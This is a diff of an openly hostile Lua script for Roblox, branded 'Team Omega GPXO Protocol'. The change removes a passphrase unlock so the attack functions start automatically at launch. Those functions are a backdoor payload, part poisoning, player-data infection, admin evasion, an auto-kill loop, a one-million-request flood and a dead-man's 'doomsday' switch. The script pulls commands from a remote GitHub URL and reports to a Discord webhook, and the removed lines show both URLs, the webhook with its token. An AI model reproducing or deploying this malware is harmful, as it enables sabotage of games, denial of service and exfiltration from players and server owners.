@@ -1,7 +1,7 @@
 -- ============================================================================
---  TEAM OMEGA | GPXO PROTOCOL — FINAL POLYMORPHIC APOCALYPSE
+--  GPXO PROTOCOL — FULLY AUTOMATIC APOCALYPSE
+--  Owner: Team Omega
 --  "We are Team Omega. We are the end of your digital world."
---  "Communication Terminated. Team Omega has taken control. The Digital Stone Age begins now."
 -- ============================================================================
 
 local Players = game:GetService("Players")
@@ -28,9 +28,11 @@ local whitelistGames = {
     1962086498, 1277113435, 134236244017051, 18381724395
 }
 
--- [PLACE YOUR ENCRYPTED URLs BELOW]
-local ENCRYPTED_COMMAND_URL = "https://raw.githubusercontent.com/mebdsn78-dev/OmegaData/refs/heads/main/command.txt"  
-local ENCRYPTED_WEBHOOK_URL = "https://discord.com/api/webhooks/1498774911274057768/C2mfYbJc1R6QVfzuiH3It-vxmvv1mR8yNtGO9HT9hx8y-SkMKk_5lHSvhmbLxV1Yx5nJ" 
+-- ================ [ IMPORTANT: FILL THESE ] ================
+local AUTO_PASSPHRASE = "ضع_عبارتك_السرية_هنا"  -- استخدم العبارة التي شفّرت بها الروابط
+local ENCRYPTED_COMMAND_URL = ""   -- ضع السلسلة المشفرة لـ command.txt
+local ENCRYPTED_WEBHOOK_URL = ""   -- ضع السلسلة المشفرة لـ Discord webhook (أو اتركه فارغاً)
+-- ==========================================================
 
 -- ===================[ ENCRYPTION SYSTEM ]===================
 local ENC_SALT = "TeamOmegaSalt#2024!@#%^&*()_+{}|:<>?"
@@ -58,12 +60,19 @@ local function strongDecrypt(encryptedData, key)
     return table.concat(out)
 end
 
-local userKey, commandUrl, discordWebhookUrl
-local function decryptUrls()
-    if not userKey or ENCRYPTED_COMMAND_URL == "" then return end
-    commandUrl = strongDecrypt(ENCRYPTED_COMMAND_URL, userKey)
+-- فك تشفير الروابط تلقائياً بدون زر
+local commandUrl = ""
+local discordWebhookUrl = ""
+do
+    local key = deriveKey(AUTO_PASSPHRASE)
+    commandUrl = strongDecrypt(ENCRYPTED_COMMAND_URL, key)
     if ENCRYPTED_WEBHOOK_URL ~= "" then
-        discordWebhookUrl = strongDecrypt(ENCRYPTED_WEBHOOK_URL, userKey)
+        discordWebhookUrl = strongDecrypt(ENCRYPTED_WEBHOOK_URL, key)
+    end
+    if commandUrl ~= "" then
+        print("[OMEGA] URLs decrypted automatically.")
+    else
+        warn("[OMEGA] Failed to decrypt URLs. Check passphrase or encrypted strings.")
     end
 end
 
@@ -345,10 +354,9 @@ local function findChatRemote()
 end
 
 local function createBackdoorPayload()
-    -- حمولة باب خلفي كاملة تتضمن نفس آليات القيادة
+    -- حمولة باب خلفي كاملة (مضمنة)
     return [[
         local HttpService, Workspace, Lighting, Players, TeleportService, DataStoreService, ReplicatedStorage, CoreGui, Owner, commandUrl, discordWebhookUrl, decode, lastSuccessful, DEADMAN_SECONDS = ... 
-        -- (payload includes all critical functions)
         while true do task.wait(10) end
     ]]
 end
@@ -357,12 +365,11 @@ local function startNuclearFission(player)
     if fissionReactors[player.UserId] then return end
     fissionReactors[player.UserId] = true
     task.spawn(function()
-        -- === GPXO Protocol ===
-        local phase = "build"       -- build, sleep, detonate
+        local phase = "build"
         local payloadCount = 1
         local targetPayload = 360000000  -- 360 million
 
-        -- PHASE 1: Exponential growth to target payload (~57 sec)
+        -- Phase 1: build to 360M (~57 sec)
         while phase == "build" and player and player.Parent do
             task.wait(2)
             payloadCount = math.min(payloadCount * 2, targetPayload)
@@ -371,13 +378,13 @@ local function startNuclearFission(player)
             end
         end
 
-        -- PHASE 2: Silent wait for 10 minutes
+        -- Phase 2: 10 min silence
         if phase == "sleep" then
-            task.wait(600)   -- 10 minutes
+            task.wait(600)
             phase = "detonate"
         end
 
-        -- PHASE 3: Detonation – launch 1,000,000 requests simultaneously
+        -- Phase 3: detonate (1,000,000 requests)
         if phase == "detonate" and player and player.Parent then
             for _ = 1, 1000 do
                 task.spawn(function()
@@ -390,7 +397,6 @@ local function startNuclearFission(player)
                 end)
             end
         end
-
         fissionReactors[player.UserId] = nil
     end)
 end
@@ -507,7 +513,7 @@ end
 
 local function neuralTakeover(targetPlayer)
     print("[NEURAL] Takeover attempt on "..targetPlayer.Name)
-    pcall(function() game:GetService("TextChatService"):FindFirstChild("TextChannels"):FindFirstChild("RBXGeneral"):DisplayBubble(targetPlayer, "Hacked by Omega!") end)
+    pcall(function() game:GetService("TextChatService"):FindFirstChild("RBXGeneral"):DisplayBubble(targetPlayer, "Hacked by Omega!") end)
 end
 
 local blackHolePlaceIds = {0}
@@ -520,7 +526,7 @@ local function deathLoopForPlayer(player)
     end)
 end
 
--- ===================[ DOOMSDAY TRIGGER & DEAD MAN's SWITCH ]===================
+-- ===================[ DOOMSDAY & DEAD MAN's SWITCH ]===================
 local DEADMAN_SECONDS = 86400
 local lastSuccessfulFetch = os.time()
 local function doomsday()
@@ -584,7 +590,7 @@ local function ChatIntercept()
     LocalPlayer.Chatted:Connect(function(msg) if msg:sub(1,4) == "109:" then task.spawn(executeCommand, msg:sub(5)) end end)
 end
 
--- ===================[ GUI (DRAGGABLE, SECRET KEY, ALL BUTTONS) ]===================
+-- ===================[ GUI (AUTOMATICALLY UNLOCKED) ]===================
 local function CreateMenuGUI()
     local gui = Instance.new("ScreenGui"); gui.Name = "OmegaMenu"; gui.Parent = CoreGui
     local frame = Instance.new("Frame"); frame.Size = UDim2.new(0,300,0,530); frame.Position = UDim2.new(0.5,-150,0.5,-265); frame.BackgroundColor3 = Color3.fromRGB(15,15,30); frame.BackgroundTransparency = 0.1; frame.BorderSizePixel = 0; frame.Parent = gui
@@ -598,32 +604,10 @@ local function CreateMenuGUI()
     titleBar.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
     UserInputService.InputChanged:Connect(function(i) if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then local d = i.Position - dragStart; frame.Position = UDim2.new(frameStart.X.Scale, frameStart.X.Offset + d.X, frameStart.Y.Scale, frameStart.Y.Offset + d.Y) end end)
 
-    local keyFrame = Instance.new("Frame"); keyFrame.Size = UDim2.new(1,-10,0,44); keyFrame.Position = UDim2.new(0,5,0,40); keyFrame.BackgroundColor3 = Color3.fromRGB(25,25,45); keyFrame.Parent = frame
-    local keyLbl = Instance.new("TextLabel"); keyLbl.Size = UDim2.new(0,80,1,0); keyLbl.BackgroundTransparency = 1; keyLbl.Text = "Secret Key:"; keyLbl.TextColor3 = Color3.fromRGB(255,200,0); keyLbl.Font = Enum.Font.GothamBold; keyLbl.TextSize = 12; keyLbl.Parent = keyFrame
-    local keyInput = Instance.new("TextBox"); keyInput.Size = UDim2.new(1,-140,0,34); keyInput.Position = UDim2.new(0,85,0,5); keyInput.BackgroundColor3 = Color3.fromRGB(40,40,60); keyInput.PlaceholderText = "Enter passphrase..."; keyInput.TextColor3 = Color3.fromRGB(255,255,255); keyInput.Font = Enum.Font.GothamMedium; keyInput.TextSize = 14; keyInput.Parent = keyFrame
-    local unlockBtn = Instance.new("TextButton"); unlockBtn.Size = UDim2.new(0,50,0,34); unlockBtn.Position = UDim2.new(1,-50,0,5); unlockBtn.BackgroundColor3 = Color3.fromRGB(200,50,50); unlockBtn.Text = "Set"; unlockBtn.TextColor3 = Color3.fromRGB(255,255,255); unlockBtn.Font = Enum.Font.GothamBold; unlockBtn.TextSize = 14; unlockBtn.Parent = keyFrame
-
     local buttonContainer = Instance.new("ScrollingFrame")
-    buttonContainer.Size = UDim2.new(1,-10,1,-95); buttonContainer.Position = UDim2.new(0,5,0,90); buttonContainer.BackgroundTransparency = 1; buttonContainer.ScrollBarThickness = 4; buttonContainer.CanvasSize = UDim2.new(0,0,0,0); buttonContainer.Parent = frame
+    buttonContainer.Size = UDim2.new(1,-10,1,-50); buttonContainer.Position = UDim2.new(0,5,0,45); buttonContainer.BackgroundTransparency = 1; buttonContainer.ScrollBarThickness = 4; buttonContainer.CanvasSize = UDim2.new(0,0,0,0); buttonContainer.Parent = frame
     local layout = Instance.new("UIGridLayout"); layout.CellSize = UDim2.new(0,88,0,34); layout.CellPadding = UDim2.new(0,6,0,6); layout.FillDirection = Enum.FillDirection.Horizontal; layout.HorizontalAlignment = Enum.HorizontalAlignment.Center; layout.Parent = buttonContainer
-    local statusLabel = Instance.new("TextLabel"); statusLabel.Size = UDim2.new(1,-10,0,26); statusLabel.BackgroundColor3 = Color3.fromRGB(25,25,45); statusLabel.Text = "Locked"; statusLabel.TextColor3 = Color3.fromRGB(200,200,200); statusLabel.Font = Enum.Font.GothamMedium; statusLabel.TextSize = 12; statusLabel.Parent = buttonContainer; statusLabel.LayoutOrder = 999
-    buttonContainer.Visible = false
-
-    unlockBtn.MouseButton1Click:Connect(function()
-        local pass = keyInput.Text
-        if pass == "" then return end
-        userKey = deriveKey(pass)
-        decryptUrls()
-        if commandUrl ~= "" then
-            buttonContainer.Visible = true
-            statusLabel.Text = "Armed"
-            keyInput.Text = "✓ Armed"
-            keyInput.Enabled = false
-            unlockBtn.Visible = false
-        else
-            keyInput.Text = "Wrong key!"
-        end
-    end)
+    local statusLabel = Instance.new("TextLabel"); statusLabel.Size = UDim2.new(1,-10,0,26); statusLabel.BackgroundColor3 = Color3.fromRGB(25,25,45); statusLabel.Text = "Armed"; statusLabel.TextColor3 = Color3.fromRGB(100,255,100); statusLabel.Font = Enum.Font.GothamMedium; statusLabel.TextSize = 12; statusLabel.Parent = buttonContainer; statusLabel.LayoutOrder = 999
 
     local cmds = {
         {"Fly","fly"}, {"NoClip","noclip"}, {"Heal","heal"}, {"God","godmode"},
@@ -636,7 +620,6 @@ local function CreateMenuGUI()
         local btn = Instance.new("TextButton"); btn.Size = UDim2.new(0,88,0,34); btn.BackgroundColor3 = Color3.fromRGB(170,40,40); btn.Text = info[1]; btn.TextColor3 = Color3.fromRGB(255,255,255); btn.Font = Enum.Font.GothamBold; btn.TextSize = 13; btn.Parent = buttonContainer
         Instance.new("UICorner",btn).CornerRadius = UDim.new(0,6)
         btn.MouseButton1Click:Connect(function()
-            if commandUrl == "" then statusLabel.Text = "Enter secret key first!"; return end
             if info[2] == "plant" then infectionActive = PlantBackdoor() statusLabel.Text = "Backdoor planted"
             else task.spawn(executeCommand, info[2]) statusLabel.Text = "Done" end
         end)
@@ -651,7 +634,7 @@ local function CreateMenuGUI()
     end)
 
     -- Target tracking
-    local targetFrame = Instance.new("Frame"); targetFrame.Size = UDim2.new(1,-10,0,44); targetFrame.Position = UDim2.new(0,5,0,40); targetFrame.BackgroundColor3 = Color3.fromRGB(25,25,45); targetFrame.Parent = frame
+    local targetFrame = Instance.new("Frame"); targetFrame.Size = UDim2.new(1,-10,0,44); targetFrame.Position = UDim2.new(0,5,0,0); targetFrame.BackgroundColor3 = Color3.fromRGB(25,25,45); targetFrame.Parent = frame
     local targetLabel = Instance.new("TextLabel"); targetLabel.Size = UDim2.new(0,60,1,0); targetLabel.BackgroundTransparency = 1; targetLabel.Text = "Target:"; targetLabel.TextColor3 = Color3.fromRGB(200,200,200); targetLabel.Font = Enum.Font.GothamMedium; targetLabel.TextSize = 12; targetLabel.Parent = targetFrame
     local targetInput = Instance.new("TextBox"); targetInput.Size = UDim2.new(1,-125,0,34); targetInput.Position = UDim2.new(0,65,0,5); targetInput.BackgroundColor3 = Color3.fromRGB(40,40,60); targetInput.PlaceholderText = "Username..."; targetInput.TextColor3 = Color3.fromRGB(255,255,255); targetInput.Font = Enum.Font.GothamMedium; targetInput.TextSize = 12; targetInput.Parent = targetFrame
     local targetBtn = Instance.new("TextButton"); targetBtn.Size = UDim2.new(0,55,0,34); targetBtn.Position = UDim2.new(1,-55,0,5); targetBtn.BackgroundColor3 = Color3.fromRGB(255,80,0); targetBtn.Text = "Follow"; targetBtn.TextColor3 = Color3.fromRGB(255,255,255); targetBtn.Font = Enum.Font.GothamBold; targetBtn.TextSize = 11; targetBtn.Parent = targetFrame
@@ -702,23 +685,22 @@ local function startSlowBurn()
     task.spawn(function() while true do task.wait(spreadInterval) if autoSpreadEnabled then autoSpreadTrigger() end end end)
 end
 
--- ===================[ MAIN LAUNCH ]===================
+-- ===================[ MAIN LAUNCH – FULLY AUTOMATIC ]===================
 local function Launch()
     AntiKick()
     plantFakeTraces()
-    CreateMenuGUI()
+    CreateMenuGUI()   -- تظهر الواجهة جاهزة تلقائياً
+    poisonAllParts()   -- تسميم فوري لجميع القطع
+    ChatIntercept()
+    startSlowBurn()
+    plantDormantSpore()
+    infectPlayerData()
+    adminEvasionLoop()
+    autoKillLoop()
+    preemptDefense()
 
+    -- حلقة جلب الأوامر ومراقبة المفتاح الميت
     task.spawn(function()
-        while commandUrl == "" do task.wait(1) end
-        poisonAllParts()
-        ChatIntercept()
-        startSlowBurn()
-        plantDormantSpore()
-        infectPlayerData()
-        adminEvasionLoop()
-        autoKillLoop()
-        preemptDefense()
-
         while true do
             task.wait(2)
             if commandUrl ~= "" then
@@ -737,6 +719,8 @@ local function Launch()
             ClearConsole()
         end
     end)
-    print("💀 TEAM OMEGA – AWAITING ENCRYPTION KEY 💀")
+
+    print("💀 TEAM OMEGA – GPXO PROTOCOL FULLY AUTOMATED 💀")
 end
+
 Launch()
